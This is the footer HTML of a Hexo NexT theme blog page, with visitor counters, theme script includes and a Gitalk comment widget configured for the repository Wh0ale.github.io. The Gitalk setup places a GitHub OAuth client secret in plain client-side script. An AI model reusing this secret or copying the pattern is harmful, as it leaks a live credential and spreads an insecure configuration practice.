      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  
    <span class="post-meta-divider">|</span>
  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="总访问量">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  
    
    
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/jquery/index.js?v=3.4.1"></script>
  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
  <script src="/lib/reading_progress/reading_progress.js"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  <script src="/js/utils.js?v=7.3.0"></script>
  <script src="/js/motion.js?v=7.3.0"></script>

  
  <script src="/js/affix.js?v=7.3.0"></script>
  <script src="/js/schemes/pisces.js?v=7.3.0"></script>



  
  <script src="/js/scrollspy.js?v=7.3.0"></script>
<script src="/js/post-details.js?v=7.3.0"></script>



  <script src="/js/next-boot.js?v=7.3.0"></script>

  

  

  


  























  <script src="/js/local-search.js?v=7.3.0"></script>













    
<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>

<script>
  var gitalk = new Gitalk({
    clientID: '925b9aa350afc793e04c',
    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
    repo: 'Wh0ale.github.io',
    owner: 'Wh0ale',
    admin: ['Wh0ale'],
    id: md5(location.pathname),
      language: window.navigator.language || window.navigator.userLanguage,
    
    distractionFreeMode: 'true'
  });
  gitalk.render('gitalk-container');
</script>


</body>
</html>
